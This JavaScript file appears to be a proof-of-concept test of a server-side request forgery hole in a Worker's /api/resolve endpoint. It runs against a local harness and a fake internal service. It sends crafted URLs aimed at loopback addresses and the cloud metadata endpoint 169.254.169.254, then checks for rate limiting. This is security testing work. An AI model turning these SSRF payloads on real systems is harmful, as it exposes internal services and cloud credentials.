// /api/resolve?url=... makes the Worker fetch an attacker-named origin.
import http from "node:http";
import { makeEnv, makeKv, call } from "../../tests/harness.mjs";

const hits = [];
const victim = http.createServer((req, res) => {
  hits.push({ url: req.url, headers: { host: req.headers.host, ua: req.headers["user-agent"] } });
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ ok: true, entries: [{ id: "x", url: "tmdb:chart:popular", type: "movie", name: "INJECTED FROM INTERNAL HOST" }] }));
});
await new Promise((r) => victim.listen(0, "127.0.0.1", r));
const port = victim.address().port;
console.log("internal 'service' listening on 127.0.0.1:" + port);

const env = makeEnv({ CONFIGS: makeKv() });
// A config that decodes to zero entries, so the remote branch is taken.
const emptyCfg = Buffer.from(JSON.stringify({ entries: [] })).toString("base64").replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");

for (const target of [
  `http://127.0.0.1:${port}/anything`,
  `http://localhost:${port}/`,
  `http://169.254.169.254/latest/meta-data/`,
  `http://[::1]:${port}/`,
  `https://internal.example.test/`,
]) {
  const r = await call(env, `/api/resolve?config=${emptyCfg}&url=${encodeURIComponent(target)}`);
  console.log(String(r.status).padStart(3), target.padEnd(42), JSON.stringify(r.body).slice(0, 120));
}
console.log("--- requests the Worker actually made to the internal host ---");
console.log(hits);
// Also: is there any rate limit?
let n = 0;
for (let i = 0; i < 25; i++) {
  const r = await call(env, `/api/resolve?config=${emptyCfg}&url=${encodeURIComponent("http://127.0.0.1:" + port + "/rl" + i)}`, { ip: "203.0.113.55" });
  if (r.status === 200) n++;
}
console.log("25 rapid SSRF calls from one IP -> 200s:", n, " internal hits total:", hits.length);
victim.close();
